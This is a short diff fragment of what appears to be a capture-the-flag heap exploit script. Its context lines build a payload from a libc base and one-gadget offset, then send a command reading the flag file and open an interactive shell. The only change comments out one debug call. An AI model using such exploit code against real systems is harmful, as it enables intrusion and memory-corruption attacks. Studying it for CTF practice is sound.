@@ -72,7 +72,7 @@ a(0x68, b'A'*0x13 + p64(libc_base + ogs[5]))
 r.sendafter('>', '1')
 r.sendafter('Size:', '101')
 """
-d(0)
+#d(0)
 
 r.sendline('cat /home/`whoami`/flag')
 r.interactive()
